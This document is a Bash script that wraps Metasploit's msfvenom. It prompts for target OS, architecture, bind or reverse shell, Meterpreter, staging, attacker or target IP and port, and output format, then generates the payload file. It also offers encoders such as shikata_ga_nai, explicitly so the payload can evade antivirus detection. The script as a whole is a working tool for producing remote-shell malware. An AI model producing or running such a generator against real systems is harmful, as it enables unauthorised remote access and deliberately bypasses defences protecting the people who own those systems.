
#!/bin/bash
#A script that creates a wrapper around MSFvenom and allows for easier payload generation.

file="payload_sign.txt"
cat $file

#Asks user for target operating system and validates entry.
validate_os(){
echo "What is the target of your operating system? Example: windows, linux, osx"
read OS
case  $OS in 
        windows|linux|osx)
        ;;
        *)
        echo "$OS is not one of the options. Please enter windows, linux, or osx."
        validate_os
        ;;
esac
}

validate_os

#Asks user for target system architecture and validates user entry.
validate_arc(){
echo "Is it 64 bit or 32? Please type 32 or 64."
read architecture
case $architecture in 
	32|64)
	;;
	*)
	echo "$architecture is not one of the options."
	validate_arc
	;;
esac
}

validate_arc

#Sets arc to "" for Windows 32 bit.

no_arc_display(){
case $OS in
        windows)
                arc=""
        ;;
esac
}

#Asks user whether they would like to have a meterpreter shell and checks whether user input is part of the list.
meterpreter_question(){
echo "Would you like to use meterpreter? Please indicate y for yes and n for no."
read meterpreter
case $meterpreter in 
	y|n)
	;;
	*)
	echo "$meterpreter is not one of the options."
	meterpreter_question
	;;
esac
}

#Sets meterpreter use to "n" for 32 bit OSX.
linux_x86_meterpreter(){
case  $OS in
	linux|windows)
		meterpreter_question
	;;
	osx)
		meterpreter='n'
	;;
esac
}

#Asks user whether they would like a staged or unstaged payload and validates user input.
validate_stage(){
echo "Would you like your payload staged or stageless? Please indicate 1 for staged and 2 for stageless."
read stage
case $stage in 
	1|2)
	;;
	*)
	echo "$stage is not one of the options."
	validate_stage
	;;
esac
}

validate_stage

#Sets symbol depending on whether payload will be staged or unstaged.
stage_symbol=""

case $stage in
	1)
		stage_symbol="/"
	;;
	2)
		stage_symbol="_"
	;;
esac

#Function to determine whether to ask meterpreter question.
case $architecture in
	32)
		arc="/x86"
		arc_display="-a x86"
		no_arc_display
		linux_x86_meterpreter
	;;

	64)
		arc="/x64"
		arc_display="-a x64"
		meterpreter_question
	;;
esac

#Asks user whether they would like a bind shell or reverse shell and checks for correct entry.
validate_shell(){
echo "Would you like to generate a bind shell or reverse shell? Please enter bind or reverse."
read shell
case $shell in 
	bind|reverse)
	;;
	*)
	echo "$shell is not one of the options."
	validate_shell
	;;
esac
}

validate_shell

#Functions to ask user for IP address and validates correct IP.
correct_ip="false"

check_ip(){
octet="(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])"
ip_regex="^$octet\.$octet\.$octet\.$octet$"
if [[ $ip =~ $ip_regex ]];
then
	correct_ip="true"
else
	echo "$ip is not a valid IP address. Please enter a valid IP address."
	read ip
fi
}

find_correct_ip(){
while [ "$correct_ip" = "false" ];
do
	check_ip
done
}

#Functions to ask user for port number and to validate correct port numbers.
correct_port="false"
check_port() {
if [[ $port -gt 65535 ]] || [[ $port -lt 1 ]];
then
	echo "$port is not a valid port number. Please choose a number between 1 and 65,535."
	read port
else
	correct_port="true"
fi
}

find_correct_port(){
while [ "${correct_port}" = "false" ];
do
	check_port;
done
}

#Case questions for users that want bind or reverse shells
ip_port=""

case $shell in
  reverse)
   	echo "Please enter your IP address."
        read ip
	check_ip
	find_correct_ip
        echo "Please enter the port you would like to listen on."
        read port
	check_port
	find_correct_port
	ip_port="LHOST=$ip LPORT=$port"
    ;;
  bind)
        echo "Please enter your target's IP address."
	read ip
	check_ip
	find_correct_ip
	echo "Please enter the port you want your target to listen on."
        read port
	check_port
	find_correct_port
	ip_port="RHOST=$ip RPORT=$port"
    ;;
esac

#Asks user to input file format and validates input.
validate_form(){
echo "What would you like the file format to be? Example: exe, raw, pl, rb, c, elf, asp"
read format
case $format in 
	exe|raw|pl|rb|c|elf|asp)
	;;
	*)
	echo "$format is not one of the options."
	validate_form
	;;
esac
}

validate_form

#Asks user the type of encoder they would like to use. 
validate_encoding(){
echo "Which encoder would you like? Please specify 1 for x86/shikata_ga_nai, 2 for ruby/base64, 3 for cmd/powershell_base64, 4 for x64/xor."
read enc_format
case $enc_format in 
	1)
	enc_format="-e x86/shikata_ga_nai"
	;;
	2)
	enc_format="-e ruby/base64"
	;;
	3)
	enc_format="-e cmd/powershell_base64"
	;;
	4)
	enc_format="-e x64/xor"
	;;
	*)
	echo "$enc_format is not an option listed."
	validate_encoding
	;;
esac
}

#Asks user if they would like to encode payload and checks if user entry.
encoder_question(){
echo "Would you like to use an encoder to evade antivirus or antimalware detection? Please indicate y for yes and n for no."
read enc_question
case $enc_question in
	y)
	validate_encoding
	;;
	n)
	;;
	*)
	echo "$enc_question is not an option listed."
	encoder_question
	;;
esac
}

encoder_question

#Prompts user to enter the number of iterations to encode the payload and validates entry.
validate_iteration(){
echo "How many iterations of encoding would you like?"
read iteration

enc_regex="^[0-9]+$"
if [[ $iteration =~ $enc_regex ]];
then
        iteration="-i $iteration"
else
        echo "$iteration is not a valid number"
        validate_iteration
fi
}

#Asks user the validate_iteration question only if they want to encode the payload.
case $enc_question in
        y)
        validate_iteration
        ;;
        n)
        ;;
        *)
esac

#Asks user for desired filename.
echo "What would you like to name the file?"
read filename

#Functions for using meterpreter and determining string format
payload=""
msfgen=""

use_meterpreter() {
	msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} --platform ${OS} ${arc_display} ${enc_format} $iteration -f $format"
}

no_meterpreter() {
        msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} --platform ${OS} ${arc_display} ${enc_format} $iteration -f $format"
}

case  $meterpreter  in
	y)
	payload="${OS}${arc}/meterpreter"
	use_meterpreter
	echo "You will be creating a Meterpreter $shell shell payload for $architecture bit $OS in $format format."
        ;;
	n)
	payload="${OS}${arc}/shell"
	no_meterpreter
	echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
        ;;
	*)
esac

#Shows user final payload generating string
echo "msfvenom -p $msfgen"

#Calls msfvenom directly and generates an output file.
msfvenom -p $msfgen > ${filename}.${format}

